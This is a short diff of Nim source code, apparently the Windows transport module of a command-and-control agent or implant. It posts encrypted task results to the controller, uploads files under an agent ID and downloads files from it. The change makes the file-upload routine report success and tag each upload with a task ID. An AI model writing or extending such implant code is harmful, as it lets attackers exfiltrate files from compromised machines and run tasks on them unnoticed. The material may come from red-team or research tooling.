@@ -208,9 +208,10 @@ proc sendResult*(t: var AgentTransport; taskId: int64; output, errStr: string) =
   discard t.winHttpDo("POST", "/result/" & t.agentId, sealGCM(t.aesKey, plain))
 
 proc uploadFile*(t: var AgentTransport; taskId: int64;
-                 filename: string; data: seq[byte]) =
-  discard t.winHttpDo("POST", "/upload/" & t.agentId & "/" & filename,
-                      sealGCM(t.aesKey, data))
+                 filename: string; data: seq[byte]): bool =
+  let (code, _) = t.winHttpDo("POST", "/upload/" & t.agentId & "/" & filename & "?task_id=" & $taskId,
+                              sealGCM(t.aesKey, data))
+  return code == 200
 
 proc downloadFile*(t: var AgentTransport; filename: string): seq[byte] =
   let (code, resp) = t.winHttpDo("GET", "/dl/" & t.agentId & "/" & filename)
